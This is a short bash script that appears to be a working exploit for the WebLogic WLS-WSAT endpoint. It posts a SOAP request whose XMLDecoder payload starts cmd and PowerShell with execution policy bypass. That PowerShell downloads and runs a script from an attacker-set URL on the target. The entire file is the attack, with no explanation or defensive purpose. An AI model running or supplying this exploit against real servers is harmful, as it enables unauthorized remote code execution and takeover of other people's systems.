#!/bin/bash
HOST=$1 # Same format as scanner.sh
YOURPSPAYLOAD="https://example.com/gothaxed.ps1"

curl -i -s -k  -X $'POST' -H $'content-type: text/xml' -H $'User-Agent: python-requests/2.2.1 CPython/2.7.6 Linux/3.19.0-25-generic' --data-binary $'<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \x0d\x0a\x09<soapenv:Header>\x0d\x0a\x09\x09<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \x0d\x0a\x09\x09\x09<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \x0d\x0a\x09\x09\x09<void class=\"java.lang.ProcessBuilder\"> \x0d\x0a\x09\x09\x09\x09<array class=\"java.lang.String\" length=\"3\">\x0d\x0a\x09\x09\x09\x09<void index = \"0\">\x0d\x0a\x09\x09\x09\x09\x09<string>cmd</string>\x0d\x0a\x09\x09\x09\x09</void>\x0d\x0a\x09\x09\x09\x09<void index = \"1\"> \x0d\x0a\x09\x09\x09\x09\x09<string>/c</string> \x0d\x0a\x09\x09\x09\x09</void>\x0d\x0a\x09\x09\x09\x09<void index = \"2\">\x0d\x0a\x09\x09\x09\x09\x09<string>powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString(&apos;'$(printf $YOURPSPAYLOAD)'$'&apos;)</string>\x0d\x0a\x09\x09\x09\x09</void>\x0d\x0a\x09\x09\x09</array>\x0d\x0a\x09\x09\x09<void method=\"start\"/>\x0d\x0a\x09\x09\x09</void>\x0d\x0a\x09\x09\x09</java>\x0d\x0a\x09\x09\x09</work:WorkContext> \x0d\x0a\x09</soapenv:Header> \x0d\x0a<soapenv:Body/>\x0d\x0a</soapenv:Envelope>\x0d\x0a'    $HOST/wls-wsat/CoordinatorPortType
